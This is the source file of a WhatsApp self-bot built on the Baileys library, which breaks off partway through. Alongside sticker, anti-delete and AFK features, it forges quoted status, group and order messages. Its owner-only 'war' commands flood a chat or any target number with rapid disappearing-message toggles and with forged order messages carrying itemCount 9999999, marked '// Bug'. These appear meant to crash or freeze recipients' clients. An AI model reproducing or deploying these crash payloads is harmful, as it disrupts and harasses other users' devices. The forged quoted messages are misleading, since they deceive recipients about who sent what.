/*
*
*         BASE : MhankBarbar
*         Remodifikasi : X - MrG3P5
*
*/

// MODULE
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_DEFAULT_EPHEMERAL,
		WA_MESSAGE_STUB_TYPES,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const speed = require('performance-now')
const { Utils_1 } = require('./node_modules/@adiwajshing/baileys/lib/WAConnection/Utils')
const tiktod = require('tiktok-scraper')
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const imageToBase64 = require('image-to-base64');
const { removeBackgroundFromImageFile } = require('remove.bg')
const { spawn, exec, execSync } = require("child_process")
const fetchs = require("node-superfetch");
const ms = require('parse-ms')
const toMs = require('ms')

/* CALLBACK */
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const { error } = require("qrcode-terminal")
const { exif } = require('./lib/exif')

/* DATABASE */
const publikchat = JSON.parse(fs.readFileSync('./src/publik.json'))
const afkdatabase = JSON.parse(fs.readFileSync('./src/afk-taggc.json'))
let { afkkontak, afktag, isSelfOnlys } = JSON.parse(fs.readFileSync('./config.json'))
const setiker = JSON.parse(fs.readFileSync('./src/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./src/video.json'))
const audionye = JSON.parse(fs.readFileSync('./src/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./src/image.json'))
const truth = JSON.parse(fs.readFileSync('./src/truth.json'))
const dare = JSON.parse(fs.readFileSync('./src/dare.json'))
const config = JSON.parse(fs.readFileSync('./config.json'))
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss DD/MM/YYYY")

var hahahaha = ['*MFarelS*', '*MFarelSZ*', '*Website : MFarelSZ.xyz*', '*MFarelSZ.xyz*', '*YouTube : MFarelSZ*', '*Instagram : @mfarelsz*', '*@mfarelsz*', '*GitHub : MFarelS*', '*https://mfarelsz.xyz*', '*https://MFarelSZ.xyz*', '*mfarelsz.xyz*'];
var hahaha = hahahaha[Math.floor(Math.random() * hahahaha.length)]

publik = false
prefix = '.'
fake = `${hahaha}`
numbernye = '0'
targetprivate = '6281219087237'
ghoibsu = 'tes'
myteks = 'test'
targetnye = '0'
blocked = []

// FUNCTION
function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);
	return `「 *RUNTIME* 」\n\n${pad(hours)} Jam\n${pad(minutes)} Menit\n${pad(seconds)} Detik`
}

function isSelfOnly(sender) {
	if (isSelfOnlys == true) {
		return false
	} else {
		return true
	}
}

function convertBalanceToString(angka) {
	var balancenyeini = '';
	var angkarev = angka.toString().split('').reverse().join('');
	for (var i = 0; i < angkarev.length; i++) if (i % 3 == 0) balancenyeini += angkarev.substr(i, 3) + '.';
	return '' + balancenyeini.split('', balancenyeini.length - 1).reverse().join('');
}

function addMetadata(packname, author) {
	if (!packname) packname = `${config.packname}`; if (!author) author = ` ${config.author}`;
	author = author.replace(/[^a-zA-Z0-9]/g, '');
	let name = `${author}_${packname}`

	if (fs.existsSync(`./src/sticker/${name}.exif`)) {
		return `./src/sticker/${name}.exif`
	}
	const json = {
		"sticker-pack-name": packname,
		"sticker-pack-publisher": author,
	}

	const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
	const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]

	let len = JSON.stringify(json).length
	let last

	if (len > 256) {
		len = len - 256
		bytes.unshift(0x01)
	} else {
		bytes.unshift(0x00)
	}

	if (len < 16) {
		last = len.toString(16)
		last = "0" + len
	} else {
		last = len.toString(16)
	}

	const buf2 = Buffer.from(last, "hex")
	const buf3 = Buffer.from(bytes)
	const buf4 = Buffer.from(JSON.stringify(json))

	const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])

	fs.writeFile(`./src/sticker/${name}.exif`, buffer, (err) => {
		return `./src/sticker/${name}.exif`
	}
	)
}

function serialize(chat) {
	m = JSON.parse(JSON.stringify(chat))
	content = m.message
	//.text = m.message.conversation 
	m.isGroup = m.key.remoteJid.endsWith('@g.us')
	try {
		const berak = Object.keys(content)[0]
		m.type = berak
	} catch {
		m.type = null
	}
	try {
		const context = m.message.extendedTextMessage.contextInfo.quotedMessage
		m.quoted = context
	} catch {
		m.quoted = null
	}

	try {
		const mention = m.message[m.type].contextInfo.mentionedJid
		m.mentionedJid = mention
	} catch {
		m.mentionedJid = null
	}

	if (m.isGroup) {
		m.sender = m.participant
	} else {
		m.sender = m.key.remoteJid
	}
	if (m.key.fromMe) {
		m.sender = client.user.jid
	}
	txt = (m.type === 'conversation' && m.message.conversation) ? m.message.conversation : (m.type == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.type == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.type == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : ""
	m.text = txt
	return m
}

const sleep = async (ms) => {
	return new Promise(resolve => setTimeout(resolve, ms));
}

const client = new WAConnection()

client.on('qr', qr => {
	qrcode.generate(qr, { small: true })
	console.log(`[ ${time} ] QR CODE SIAP DI SCAN`)
})

client.on('credentials-updated', () => {
	const authInfo = client.base64EncodedAuthInfo()
	console.log(`credentials updated!`)

	fs.writeFileSync('./session.json', JSON.stringify(authInfo, null, '\t'))
})

fs.existsSync('./session.json') && client.loadAuthInfo('./session.json')

client.connect();

client.on('CB:Blocklist', json => {
	if (blocked.length > 2) return
	for (let i of json[1].blocklist) {
		blocked.push(i.replace('c.us', 's.whatsapp.net'))
	}
})

// FUNCTION ANTI DELETE
client.on('message-update', async (geps) => {
	try {
		const from = geps.key.remoteJid
		const messageStubType = WA_MESSAGE_STUB_TYPES[geps.messageStubType] || 'MESSAGE'
		const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
		const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
		const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
		let sender = geps.key.fromMe ? client.user.jid : geps.key.remoteJid.endsWith('@g.us') ? geps.participant : geps.key.remoteJid
		const isRevoke = geps.key.remoteJid.endsWith('@s.whatsapp.net') ? true : geps.key.remoteJid.endsWith('@g.us') ? dataRevoke.includes(from) : false
		const isCtRevoke = geps.key.remoteJid.endsWith('@g.us') ? true : dataCtRevoke.data ? true : false
		const isBanCtRevoke = geps.key.remoteJid.endsWith('@g.us') ? true : !dataBanCtRevoke.includes(sender) ? true : false
		if (messageStubType == 'REVOKE') {
			console.log(`Status Untuk Grup : ${!isRevoke}\nStatus Semua Kontak : ${!isCtRevoke}\nStatus Kontak Dikecualikan : ${!isBanCtRevoke}`)
			if (!isRevoke) return
			if (!isCtRevoke) return
			if (!isBanCtRevoke) return
			const from = geps.key.remoteJid
			const isGroup = geps.key.remoteJid.endsWith('@g.us') ? true : false
			let int
			let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
			const id_deleted = geps.key.id
			const conts = geps.key.fromMe ? client.user.jid : client.contacts[sender] || { notify: jid.replace(/@.+/, '') }
			const pushname = geps.key.fromMe ? client.user.name : conts.notify || conts.vname || conts.name || '-'
			const opt4tag = {
				contextInfo: { mentionedJid: [sender] }
			}
			for (let i = 0; i < infoMSG.length; i++) {
				if (infoMSG[i].key.id == id_deleted) {
					const dataInfo = infoMSG[i]
					const type = Object.keys(infoMSG[i].message)[0]
					const timestamp = infoMSG[i].messageTimestamp
					int = {
						no: i,
						type: type,
						timestamp: timestamp,
						data: dataInfo
					}
				}
			}
			const index = Number(int.no)
			const body = int.type == 'conversation' ? infoMSG[index].message.conversation : int.type == 'extendedTextMessage' ? infoMSG[index].message.extendedTextMessage.text : int.type == 'imageMessage' ? infoMSG[index].message.imageMessage.caption : int.type == 'stickerMessage' ? 'Sticker' : int.type == 'audioMessage' ? 'Audio' : int.type == 'videoMessage' ? infoMSG[index].videoMessage.caption : infoMSG[index]
			const mediaData = int.type === 'extendedTextMessage' ? JSON.parse(JSON.stringify(int.data).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : int.data
			if (int.type == 'conversation' || int.type == 'extendedTextMessage') {
				const strConversation = `「 *ANTI-DELETE* 」

• Nama: ${pushname}
• Nomor: @${sender.replace('@s.whatsapp.net', '')}
• Tipe: Teks/Text
• Waktu: ${moment.unix(int.timestamp).format('HH:mm:ss DD/MM/YYYY')}
• Pesan: ${body ? body : '-'}
`
			client.sendMessage(from, strConversation, MessageType.text, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
			} else if (int.type == 'stickerMessage') {
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
				const savedFilename = await client.downloadAndSaveMediaMessage(int.data, `./media/sticker/${filename}`);
				const strConversation = `「 *ANTI-DELETE* 」

• Nama: ${pushname}
• Nomor: @${sender.replace('@s.whatsapp.net', '')}
• Tipe: Stiker/Sticker
• Waktu: ${moment.unix(int.timestamp).format('HH:mm:ss DD/MM/YYYY')}
`

				const buff = fs.readFileSync(savedFilename)
			client.sendMessage(from, strConversation, MessageType.text, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
			client.sendMessage(from, buff, MessageType.sticker, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				fs.unlinkSync(savedFilename)

			} else if (int.type == 'imageMessage') {
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
				const savedFilename = await client.downloadAndSaveMediaMessage(int.data, `./media/image/${filename}`);
				const buff = fs.readFileSync(savedFilename)
				const strConversation = `「 *ANTI-DELETE* 」

• Nama: ${pushname}
• Nomor: @${sender.replace('@s.whatsapp.net', '')}
• Tipe: Gambar/Image
• Waktu: ${moment.unix(int.timestamp).format('HH:mm:ss DD/MM/YYYY')}
• Pesan: ${body ? body : '-'}\`\`\`
`
			client.sendMessage(from, buff, MessageType.image, {
				caption: strConversation,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				fs.unlinkSync(savedFilename)
			}
		}
	} catch (e) {
		console.log('Message : %s', color(e, 'green'))
		// console.log(e)
	}
})

client.on('message-new', async (mek) => {
	try {
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		//if (!mek.key.fromMe) return
		let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
		infoMSG.push(JSON.parse(JSON.stringify(mek)))
		fs.writeFileSync('./src/.dat/msg.data.json', JSON.stringify(infoMSG, null, 2))
		const urutan_pesan = infoMSG.length
		if (urutan_pesan === 5000) {
			infoMSG.splice(0, 4300)
			fs.writeFileSync('./src/.dat/msg.data.json', JSON.stringify(infoMSG, null, 2))
		}

		global.blocked
		const content = JSON.stringify(mek.message)
		const msg = serialize(mek)
		const from = mek.key.remoteJid
		const isPublikChat = mek.key.fromMe == false
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')
		const type = Object.keys(mek.message)[0]
		body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')

		mess = {
			wait: '*[ MFarelSZ ] Sabar, Sedang Di Proses...*',
			success: '*[ MFarelSZ ] Sukses, Berhasil!!!*',
			afkalready: '*[ MFarelSZ ] AFK, Telah Diaktifkan Sebelumnya...*',
			afkgroupalready: '*[ MFarelSZ ] AFK Di Grup Ini, Telah Diaktifkan Sebelumnya...*',
			wrongFormat: '*[ MFarelSZ ] Error, Format Salah!*',
			afkdisable: '*[ MFarelSZ ] Sukses, AFK Telah Dimatikan!*',
			afkenable: '*[ MFarelSZ ] Sukses, AFK Telah Diaktifkan!*',
			sedangafk: '\n*Maaf, Saat Ini MFarelS Sedang Offline!*\n*Hubungi Lagi Leberapa Saat...*\n\n*~ MFarelSZ BOT*\n',
			error: {
				stick: '*[ MFarelSZ ] Error, Bukan Sticker Itu...*',
				Iv: '*[ MFarelSZ ] Error, Link Invalid!*'
			},
			only: {
				group: '*[ MFarelSZ ] Error, Khusus Grup!*',
				ownerG: '*[ MFarelSZ ] Error, Khusus Owner Grup!*',
				ownerB: '*[ MFarelSZ ] Error, Khusus MFarelSZ!*',
				admin: '*[ MFarelSZ ] Error, Khusus Admin Grup!*',
				Badmin: '*[ MFarelSZ ] Error, Jadikan Bot Admin!*'
			}
		}

		const botNumber = client.user.jid
		const botNumberss = client.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		// const isSelfNumber = config.NomorSELF
		// const isOwner = sender.id === isSelfNumber
		const totalchat = await client.chats.all()
		const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isAFKTAG = isGroup ? afkdatabase.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isUrl = (url) => {
			return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
		}

		const reply = (teks) => {
			client.sendMessage(from, teks, text, { quoted: mek })
		}

		const sendMess = (hehe, teks) => {
			client.sendMessage(hehe, teks, text)
		}

		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}

		const sendPtt = (audio) => {
			client.sendMessage(from, audio, mp3, { quoted: mek })
		}

		const fakestatus = (teks) => {
			client.sendMessage(from, teks, text, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
					},
					message: {
						"imageMessage": {
							"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
							"mimetype": "image/jpeg",
							"caption": fake,
							"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
							"fileLength": "28777",
							"height": 512,
							"width": 512,
							"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
							"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
							"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
							"mediaKeyTimestamp": "1610993486",
							"jpegThumbnail": fs.readFileSync('./src/image/MFarelSZ.jpeg'),
							"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
						}
					}
				}
			})
		}

		const fakegroup = (teks) => {
			client.sendMessage(from, teks, text, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
						"imageMessage": {
							"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
							"mimetype": "image/jpeg",
							"caption": fake,
							"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
							"fileLength": "28777",
							"height": 128,
							"width": 128,
							"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
							"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
							"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
							"mediaKeyTimestamp": "1610993486",
							"jpegThumbnail": fs.readFileSync('./src/image/MFarelSZ.jpeg'),
							"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
						}
					}
				}
			})
		}

		const faketroli = (teks) => {
			client.sendMessage(from, teks, text, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
		}

		// FUNCTION ANTI SPAM SAAT AFK
		const addChatAFK = (isPublikChat, expired) => {
			let obi = { id: isPublikChat, expired: Date.now() + toMs(`${expired}s`) }
			publikchat.push(obi)
			fs.writeFileSync('./src/publik.json', JSON.stringify(publikchat))
		}

		const cekWaktuAFKCHAT = (_dir, isPublikChat) => {
			setInterval(() => {
				let position = null
				Object.keys(publikchat).forEach((i) => {
					if (Date.now() >= publikchat[i].expired) {
						position = i
					}
				})
				if (position !== null) {
					publikchat.splice(position, 1)
					fs.writeFileSync('./src/publik.json', JSON.stringify(publikchat))
				}
			}, 1000)
		}

		const isAntiSpamAFK = (isPublikChat) => {
			let status = false
			Object.keys(publikchat).forEach((i) => {
				if (publikchat[i].id === isPublikChat) {
					status = true
				}
			})
			return status
		}

		if (!isGroup && afkkontak == true && isPublikChat) {
			if (isAntiSpamAFK(isPublikChat)) { return false; }
			faketroli(mess.sedangafk)
			addChatAFK(isPublikChat, 10)
			cekWaktuAFKCHAT(isPublikChat)
		} else if (msg.mentionedJid && isAFKTAG && afktag.status == true) {
			if (msg.mentionedJid.includes(botNumber)) {
				faketroli(mess.sedangafk)
			}
		}

		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
		if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
		if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (mek.key.fromMe) {
			switch (command) {
				case 'war':
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				break
				case 'war2':
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				break
				case 'war3':
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				break
				case 'war4':
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
